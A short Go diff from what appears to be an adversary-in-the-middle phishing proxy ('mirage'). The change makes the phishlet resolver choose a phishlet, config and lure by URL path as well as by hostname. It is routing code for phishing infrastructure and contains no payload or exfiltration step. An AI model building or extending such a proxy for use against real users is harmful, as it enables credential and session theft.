@@ -9,9 +9,9 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 )
 
-// PhishletResolver resolves a hostname to its phishlet definition, config, and lure.
+// PhishletResolver resolves a hostname and URL path to its phishlet definition, config, and lure.
 type PhishletResolver interface {
-	ResolveHostname(hostname string) (*aitm.PhishletDef, *aitm.PhishletConfig, *aitm.Lure, error)
+	ResolveHostname(hostname, urlPath string) (*aitm.PhishletDef, *aitm.PhishletConfig, *aitm.Lure, error)
 }
 
 // PhishletRouter routes traffic to the appropriate phishlet based on the request hostname.
@@ -29,7 +29,7 @@ func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error
 		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
 		return proxy.ErrShortCircuit
 	}
-	phishletDef, phishletCfg, lure, err := h.Resolver.ResolveHostname(hostname)
+	phishletDef, phishletCfg, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
 	if err != nil {
 		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
 	}
